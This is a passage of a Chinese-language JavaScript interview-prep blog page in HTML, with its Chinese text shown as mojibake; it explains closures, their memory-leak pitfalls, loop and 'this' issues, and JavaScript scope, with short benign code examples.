é™é€’å½’</li><li>æŸäº›æƒ…å†µä¸‹å¯èƒ½ä¼šå¯¼è‡´å†…å­˜æ³„éœ²</li></ol><p><strong>Qï¼šä¸ºä»€ä¹ˆä½¿ç”¨ WeakMap è€Œä¸æ˜¯ Map æ¥å¤„ç†å¾ªç¯å¼•ç”¨ï¼Ÿ</strong></p><p>WeakMap çš„é”®æ˜¯å¼±å¼•ç”¨ï¼Œä¸ä¼šé˜»æ­¢åƒåœ¾å›æ”¶ï¼Œæ›´é€‚åˆè¿™ç§ä¸´æ—¶æ€§çš„å¼•ç”¨è·Ÿè¸ªåœºæ™¯</p><h1 id="JavaScript-ä¸­çš„é—­åŒ…"><a href="#JavaScript-ä¸­çš„é—­åŒ…" class="headerlink" title="JavaScript ä¸­çš„é—­åŒ…"></a>JavaScript ä¸­çš„é—­åŒ…</h1><h2 id="é—­åŒ…çš„å®šä¹‰"><a href="#é—­åŒ…çš„å®šä¹‰" class="headerlink" title="é—­åŒ…çš„å®šä¹‰"></a>é—­åŒ…çš„å®šä¹‰</h2><p>é—­åŒ…ï¼ˆclosureï¼‰æ˜¯æŒ‡èƒ½å¤Ÿè®¿é—®è‡ªç”±å˜é‡çš„å‡½æ•°ï¼Œè¿™é‡Œçš„è‡ªç”±å˜é‡æ˜¯æŒ‡ï¼š</p><ol><li>ä¸æ˜¯åœ¨è¯¥å‡½æ•°å†…éƒ¨å£°æ˜çš„</li><li>ä¹Ÿä¸æ˜¯ä½œä¸ºå‡½æ•°å‚æ•°ä¼ å…¥çš„</li><li>è€Œæ˜¯åœ¨è¯¥å‡½æ•°å®šä¹‰æ—¶çš„ä½œç”¨åŸŸä¸­å­˜åœ¨çš„å˜é‡</li></ol><p>æ›´é€šä¿—çš„è¯´ï¼šå½“ä¸€ä¸ªå‡½æ•°è®°ä½å¹¶è®¿é—®å®ƒæ‰€åœ¨çš„è¯æ³•ä½œç”¨åŸŸï¼Œå³ä½¿è¯¥å‡½æ•°åœ¨å…¶è¯æ³•ä½œç”¨åŸŸä¹‹å¤–æ‰§è¡Œï¼Œå°±äº§ç”Ÿäº†é—­åŒ…</p><h2 id="é—­åŒ…çš„ç®€å•ç¤ºä¾‹"><a href="#é—­åŒ…çš„ç®€å•ç¤ºä¾‹" class="headerlink" title="é—­åŒ…çš„ç®€å•ç¤ºä¾‹"></a>é—­åŒ…çš„ç®€å•ç¤ºä¾‹</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">outer</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> name = <span class="hljs-string">&#x27;Alice&#x27;</span>; <span class="hljs-comment">// è‡ªç”±å˜é‡</span><br>  <br>  <span class="hljs-keyword">function</span> <span class="hljs-title function_">inner</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(name); <span class="hljs-comment">// è®¿é—®å¤–éƒ¨å‡½æ•°çš„å˜é‡</span><br>  &#125;<br>  <br>  <span class="hljs-keyword">return</span> inner;<br>&#125;<br><br><span class="hljs-keyword">const</span> myFunc = <span class="hljs-title function_">outer</span>();<br><span class="hljs-title function_">myFunc</span>(); <span class="hljs-comment">// è¾“å‡º &quot;Alice&quot; â€”â€” è¿™å°±æ˜¯é—­åŒ…ï¼</span><br></code></pre></td></tr></table></figure><p>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼š</p><ol><li>inner å‡½æ•°è®¿é—®äº† outer å‡½æ•°çš„å±€éƒ¨å˜é‡ <code>name</code></li><li>inner å‡½æ•°è¢«è¿”å›å¹¶åœ¨ outer å‡½æ•°å¤–è¢«è°ƒç”¨</li><li>ä½† inner ä»ç„¶èƒ½è®¿é—® name å˜é‡</li></ol><h2 id="é—­åŒ…çš„å·¥ä½œåŸç†"><a href="#é—­åŒ…çš„å·¥ä½œåŸç†" class="headerlink" title="é—­åŒ…çš„å·¥ä½œåŸç†"></a>é—­åŒ…çš„å·¥ä½œåŸç†</h2><p>é—­åŒ…ä¹‹æ‰€ä»¥èƒ½å¤Ÿå·¥ä½œï¼Œæ˜¯å› ä¸º JavaScript çš„ä½œç”¨åŸŸé“¾ï¼ˆScope Chainï¼‰æœºåˆ¶ï¼š</p><ol><li>è¯æ³•ä½œç”¨åŸŸï¼šå‡½æ•°çš„ä½œç”¨åŸŸåœ¨å®šä¹‰æ—¶å°±å·²ç»ç¡®å®šï¼Œè€Œä¸æ˜¯åœ¨è¿è¡Œæ—¶</li><li>ä½œç”¨åŸŸé“¾ï¼šå½“è®¿é—®ä¸€ä¸ªå˜é‡æ—¶ï¼ŒJavaScript ä¼šæ²¿ç€å®šä¹‰æ—¶çš„ä½œç”¨åŸŸé“¾æŸ¥æ‰¾</li><li>å˜é‡ä¿æŒï¼šå³ä½¿å¤–éƒ¨å‡½æ•°å·²ç»æ‰§è¡Œå®Œæ¯•ï¼Œä½†åªè¦å†…éƒ¨å‡½æ•°è¿˜åœ¨å¼•ç”¨å¤–éƒ¨å˜é‡ï¼Œè¿™äº›å¤–éƒ¨å˜é‡å°±ä¸ä¼šè¢«åƒåœ¾å›æ”¶</li></ol><h2 id="é—­åŒ…çš„å¸¸è§åº”ç”¨åœºæ™¯"><a href="#é—­åŒ…çš„å¸¸è§åº”ç”¨åœºæ™¯" class="headerlink" title="é—­åŒ…çš„å¸¸è§åº”ç”¨åœºæ™¯"></a>é—­åŒ…çš„å¸¸è§åº”ç”¨åœºæ™¯</h2><p><strong>åˆ›å»ºç§æœ‰å˜é‡</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">createCounter</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">let</span> count = <span class="hljs-number">0</span>; <span class="hljs-comment">// ç§æœ‰å˜é‡</span><br>  <br>  <span class="hljs-keyword">return</span> &#123;<br>    <span class="hljs-attr">increment</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>      count++;<br>      <span class="hljs-keyword">return</span> count;<br>    &#125;,<br>    <span class="hljs-attr">decrement</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>      count--;<br>      <span class="hljs-keyword">return</span> count;<br>    &#125;,<br>    <span class="hljs-attr">getCount</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>      <span class="hljs-keyword">return</span> count;<br>    &#125;<br>  &#125;;<br>&#125;<br><br><span class="hljs-keyword">const</span> counter = <span class="hljs-title function_">createCounter</span>();<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(counter.<span class="hljs-title function_">increment</span>()); <span class="hljs-comment">// 1</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(counter.<span class="hljs-title function_">increment</span>()); <span class="hljs-comment">// 2</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(counter.<span class="hljs-title function_">decrement</span>()); <span class="hljs-comment">// 1</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(counter.<span class="hljs-property">count</span>); <span class="hljs-comment">// undefined (æ— æ³•ç›´æ¥è®¿é—®)</span><br></code></pre></td></tr></table></figure><p><strong>å‡½æ•°å·¥å‚</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">createMultiplier</span>(<span class="hljs-params">factor</span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span>(<span class="hljs-params">number</span>) &#123;<br>    <span class="hljs-keyword">return</span> number * factor;<br>  &#125;;<br>&#125;<br><br><span class="hljs-keyword">const</span> double = <span class="hljs-title function_">createMultiplier</span>(<span class="hljs-number">2</span>);<br><span class="hljs-keyword">const</span> triple = <span class="hljs-title function_">createMultiplier</span>(<span class="hljs-number">3</span>);<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">double</span>(<span class="hljs-number">5</span>)); <span class="hljs-comment">// 10</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">triple</span>(<span class="hljs-number">5</span>)); <span class="hljs-comment">// 15</span><br></code></pre></td></tr></table></figure><p><strong>æ¨¡å—æ¨¡å¼</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> myModule = (<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> privateVar = <span class="hljs-string">&#x27;I am private&#x27;</span>;<br>  <br>  <span class="hljs-keyword">function</span> <span class="hljs-title function_">privateMethod</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(privateVar);<br>  &#125;<br>  <br>  <span class="hljs-keyword">return</span> &#123;<br>    <span class="hljs-attr">publicMethod</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>      <span class="hljs-title function_">privateMethod</span>();<br>    &#125;<br>  &#125;;<br>&#125;)();<br><br>myModule.<span class="hljs-title function_">publicMethod</span>(); <span class="hljs-comment">// &quot;I am private&quot;</span><br></code></pre></td></tr></table></figure><p><strong>äº‹ä»¶å¤„ç†å’Œå›è°ƒ</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">setupButtons</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> buttons = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelectorAll</span>(<span class="hljs-string">&#x27;button&#x27;</span>);<br>  <br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; buttons.<span class="hljs-property">length</span>; i++) &#123;<br>    (<span class="hljs-keyword">function</span>(<span class="hljs-params">index</span>) &#123;<br>      buttons[index].<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;click&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Button &#x27;</span> + index + <span class="hljs-string">&#x27; clicked&#x27;</span>);<br>      &#125;);<br>    &#125;)(i);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="é—­åŒ…ä¸å†…å­˜ç®¡ç†"><a href="#é—­åŒ…ä¸å†…å­˜ç®¡ç†" class="headerlink" title="é—­åŒ…ä¸å†…å­˜ç®¡ç†"></a>é—­åŒ…ä¸å†…å­˜ç®¡ç†</h2><p><strong>å†…å­˜æ³„éœ²é£é™©</strong></p><p>é—­åŒ…ä¼šé˜»æ­¢å¤–éƒ¨å‡½æ•°ä½œç”¨åŸŸä¸­çš„å˜é‡è¢«åƒåœ¾å›æ”¶ï¼Œä¸å½“ä½¿ç”¨ä¼šå¯¼è‡´å†…å­˜æ³„éœ²</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">leakMemory</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> hugeArray = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Array</span>(<span class="hljs-number">1000000</span>).<span class="hljs-title function_">fill</span>(<span class="hljs-string">&#x27;*&#x27;</span>);<br>  <br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;I have access to hugeArray&#x27;</span>);<br>  &#125;;<br>&#125;<br><br><span class="hljs-keyword">const</span> leakingFunction = <span class="hljs-title function_">leakMemory</span>(); <span class="hljs-comment">// hugeArray ä¸ä¼šè¢«å›æ”¶</span><br><br><span class="hljs-comment">// ä¸ºä»€ä¹ˆ return function ä¸­æ²¡æœ‰ä½¿ç”¨ hugeArray å´è¿˜æ˜¯é€ æˆäº†å†…å­˜æ³„éœ²ï¼Ÿ</span><br><span class="hljs-comment">// å› ä¸ºé—­åŒ…ä¼šä¿å­˜å…¶æ‰€åœ¨çš„æ•´ä¸ªè¯æ³•ç¯å¢ƒï¼ˆåŒ…æ‹¬æ‰€æœ‰å¯è®¿é—®çš„å˜é‡ï¼‰ï¼Œè€Œä¸ä»…ä»…æ˜¯å…¶å®é™…ä½¿ç”¨çš„å˜é‡</span><br></code></pre></td></tr></table></figure><p><strong>é¿å…å†…å­˜æ³„éœ²çš„æ–¹æ³•</strong></p><p>ï¼ˆ1ï¼‰åŠæ—¶è§£é™¤å¼•ç”¨</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">leakingFunction = <span class="hljs-literal">null</span>; <span class="hljs-comment">// è§£é™¤å¼•ç”¨ï¼Œå…è®¸åƒåœ¾å›æ”¶</span><br></code></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰ä½¿ç”¨å—çº§ä½œç”¨åŸŸå˜é‡ let&#x2F;const ä»£æ›¿ var</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">setupButtons</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> buttons = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelectorAll</span>(<span class="hljs-string">&#x27;button&#x27;</span>);<br>  <br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; buttons.<span class="hljs-property">length</span>; i++) &#123;<br>    buttons[i].<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;click&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Button &#x27;</span> + i + <span class="hljs-string">&#x27; clicked&#x27;</span>);<br>    &#125;);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="é—­åŒ…çš„è¿›é˜¶ç†è§£"><a href="#é—­åŒ…çš„è¿›é˜¶ç†è§£" class="headerlink" title="é—­åŒ…çš„è¿›é˜¶ç†è§£"></a>é—­åŒ…çš„è¿›é˜¶ç†è§£</h2><p><strong>é—­åŒ…ä¸å¾ªç¯</strong></p><p>ç»å…¸çš„é—­åŒ…é¢è¯•é¢˜ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span>; i++) &#123;<br>  <span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(i);<br>  &#125;, <span class="hljs-number">1000</span>);<br>&#125;<br><span class="hljs-comment">// è¾“å‡ºäº”ä¸ª 5ï¼Œè€Œä¸æ˜¯ 0,1,2,3,4</span><br></code></pre></td></tr></table></figure><p>è§£å†³æ–¹æ³•ï¼š<br>ï¼ˆ1ï¼‰ä½¿ç”¨IIFEï¼ˆç«‹å³æ‰§è¡Œå‡½æ•°è¡¨è¾¾å¼ï¼‰</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span>; i++) &#123;<br>  (<span class="hljs-keyword">function</span>(<span class="hljs-params">j</span>) &#123;<br>    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(j);<br>    &#125;, <span class="hljs-number">1000</span>);<br>  &#125;)(i);<br>&#125;<br></code></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰ä½¿ç”¨ let å—çº§ä½œç”¨åŸŸ</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span>; i++) &#123;<br>  <span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(i);<br>  &#125;, <span class="hljs-number">1000</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>é—­åŒ…ä¸ this æŒ‡å‘</strong></p><p>é—­åŒ…ä¸­çš„ this éœ€è¦ç‰¹åˆ«æ³¨æ„ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> obj = &#123;<br>  <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;Alice&#x27;</span>,<br>  <span class="hljs-attr">sayName</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>); <span class="hljs-comment">// è¿™é‡Œçš„ this æŒ‡å‘å…¨å±€æˆ– undefined</span><br>    &#125;;<br>  &#125;<br>&#125;;<br><br>obj.<span class="hljs-title function_">sayName</span>()(); <span class="hljs-comment">// è¾“å‡º undefined æˆ–æŠ¥é”™</span><br></code></pre></td></tr></table></figure><p>è§£å†³æ–¹æ³•ï¼š<br>ï¼ˆ1ï¼‰ä½¿ç”¨ç®­å¤´å‡½æ•°</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> obj = &#123;<br>  <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;Alice&#x27;</span>,<br>  <span class="hljs-attr">sayName</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> &#123;<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>); <span class="hljs-comment">// ç®­å¤´å‡½æ•°ç»§æ‰¿å¤–å±‚ this</span><br>    &#125;;<br>  &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰ä¿å­˜ this å¼•ç”¨</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> obj = &#123;<br>  <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;Alice&#x27;</span>,<br>  <span class="hljs-attr">sayName</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">const</span> self = <span class="hljs-variable language_">this</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(self.<span class="hljs-property">name</span>);<br>    &#125;;<br>  &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="é—­åŒ…çš„ä¼˜ç¼ºç‚¹"><a href="#é—­åŒ…çš„ä¼˜ç¼ºç‚¹" class="headerlink" title="é—­åŒ…çš„ä¼˜ç¼ºç‚¹"></a>é—­åŒ…çš„ä¼˜ç¼ºç‚¹</h2><p><strong>ä¼˜ç‚¹</strong></p><ul><li>åˆ›å»ºç§æœ‰å˜é‡å’Œæ–¹æ³•</li><li>ä¿æŒå˜é‡çŠ¶æ€</li><li>å®ç°æ•°æ®å°è£…</li><li>å®ç°å‡½æ•°å·¥å‚å’Œæ¨¡å—æ¨¡å¼</li></ul><p><strong>ç¼ºç‚¹</strong></p><ul><li>å¯èƒ½å¯¼è‡´å†…å­˜æ³„æ¼</li><li>è¿‡åº¦ä½¿ç”¨å¯èƒ½ä¼šå¯¼è‡´ä»£ç éš¾ä»¥ç†è§£å’Œè°ƒè¯•</li><li>å¯èƒ½å½±å“æ€§èƒ½ï¼ˆå˜é‡æŸ¥æ‰¾è¦æ²¿ç€ä½œç”¨åŸŸé“¾ï¼‰</li></ul><h2 id="é¢è¯•å¸¸è§é—®é¢˜-2"><a href="#é¢è¯•å¸¸è§é—®é¢˜-2" class="headerlink" title="é¢è¯•å¸¸è§é—®é¢˜"></a>é¢è¯•å¸¸è§é—®é¢˜</h2><p><strong>Qï¼šå¦‚ä½•ç”¨é—­åŒ…å®ç°ä¸€ä¸ªè®¡æ•°å™¨</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">createCounter</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">let</span> count = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> ++count;<br>  &#125;;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="ä½œç”¨åŸŸ-ä½œç”¨åŸŸé“¾-thisæŒ‡å‘"><a href="#ä½œç”¨åŸŸ-ä½œç”¨åŸŸé“¾-thisæŒ‡å‘" class="headerlink" title="ä½œç”¨åŸŸ&#x2F;ä½œç”¨åŸŸé“¾&#x2F;thisæŒ‡å‘"></a>ä½œç”¨åŸŸ&#x2F;ä½œç”¨åŸŸé“¾&#x2F;thisæŒ‡å‘</h1><h2 id="ä½œç”¨åŸŸï¼ˆScopeï¼‰"><a href="#ä½œç”¨åŸŸï¼ˆScopeï¼‰" class="headerlink" title="ä½œç”¨åŸŸï¼ˆScopeï¼‰"></a>ä½œç”¨åŸŸï¼ˆScopeï¼‰</h2><p><strong>åŸºæœ¬æ¦‚å¿µ</strong></p><p>JavaScript ä¸­ï¼Œä½œç”¨åŸŸæ˜¯æŒ‡ç¨‹åºä¸­å®šä¹‰å˜é‡çš„åŒºåŸŸï¼Œå®ƒå†³å®šäº†å˜é‡çš„å¯è®¿é—®æ€§ï¼ˆå˜é‡åœ¨ä½•å¤„å¯ç”¨ï¼‰</p><p><strong>JavaScript çš„ä½œç”¨åŸŸç±»å‹</strong></p><p>ï¼ˆ1ï¼‰å…¨å±€ä½œç”¨åŸŸ</p><ul><li>åœ¨å‡½æ•°æˆ–ä»£ç å—å¤–éƒ¨å£°æ˜çš„å˜é‡</li><li>åœ¨ä»»ä½•åœ°æ–¹éƒ½å¯ä»¥è®¿é—®</li><li>åœ¨æµè§ˆå™¨ç¯å¢ƒä¸­ï¼Œå…¨å±€ä½œç”¨åŸŸæ˜¯ window å¯¹è±¡</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">var</span> globalVar = <span class="hljs-string">&#x27;å…¨å±€å˜é‡&#x27;</span>;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">test</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(globalVar); <span class="hljs-comment">// å¯ä»¥è®¿é—®</span><br>&#125;<br></code></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰å‡½æ•°ä½œç”¨åŸŸï¼ˆå±€éƒ¨ä½œç”¨åŸŸï¼‰</p><ul><li>åœ¨å‡½æ•°å†…éƒ¨å£°æ˜çš„å˜é‡</li><li>åªèƒ½åœ¨å‡½æ•°å†…éƒ¨è®¿é—®</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">test</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">var</span> localVar = <span class="hljs-string">&#x27;å±€éƒ¨å˜é‡&#x27;</span>;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(localVar); <span class="hljs-comment">// å¯ä»¥è®¿é—®</span><br>&#125;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(localVar); <span class="hljs-comment">// æŠ¥é”™: localVar is not defined</span><br></code></pre></td></tr></table></figure><p>ï¼ˆ3ï¼‰å—çº§ä½œç”¨åŸŸï¼ˆES6+ï¼‰</p><ul><li>ä½¿ç”¨ let å’Œ const å£°æ˜çš„å˜é‡</li><li>åªåœ¨{}ä»£ç å—ä¸­æœ‰æ•ˆ</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">if</span> (<span class="hljs-literal">true</span>) &#123;<br>  <span class="hljs-keyword">let</span> blockVar = <span class="hljs-string">&#x27;å—çº§å˜é‡&#x27;</span>;<br>  <span class="hljs-keyword">const</span> constVar = <span class="hljs-string">&#x27;å¸¸é‡&#x27;</span>;<br>&#125;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(blockVar); <span class="hljs-comment">// æŠ¥é”™</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(constVar); <span class="hljs-comment">// æŠ¥é”™</span><br></code></pre></td></tr></table></figure><p><strong>å˜é‡æå‡</strong></p><ul><li>var 